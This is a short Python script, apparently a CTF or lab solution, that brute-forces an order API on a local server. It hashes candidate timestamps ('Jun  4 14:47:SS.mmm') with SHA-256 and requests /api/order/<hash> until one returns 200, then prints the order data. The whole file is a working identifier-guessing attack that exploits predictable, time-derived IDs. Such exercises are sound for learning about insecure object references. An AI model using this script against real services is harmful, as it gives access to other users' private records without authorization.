import hashlib
import string
import requests

for s in range(28, 60):
	done = False
	strS = str(s)
	strS = '0' * (2 - len(strS)) + strS

	for ms in range(1000):
		strMs = str(ms)
		strMs = '0' * (3 - len(strMs)) + strMs
		str_to_hash = f"Jun  4 14:47:{strS}.{strMs}"   # почему-то с июньскими датам нужно добавлять дополнительный пробел между месяцем и числом

		sha256_hash = hashlib.sha256(str_to_hash.encode()).hexdigest()

		print(f"{str_to_hash}")
		print(f"{sha256_hash}")

		resp = requests.get(url=f"http://0.0.0.0:8000/api/order/{sha256_hash}")

		if resp.status_code == 200:
			print(f"{strS}.{strMs}")
			print(resp.text)
			done = True
			break

	if done:
		break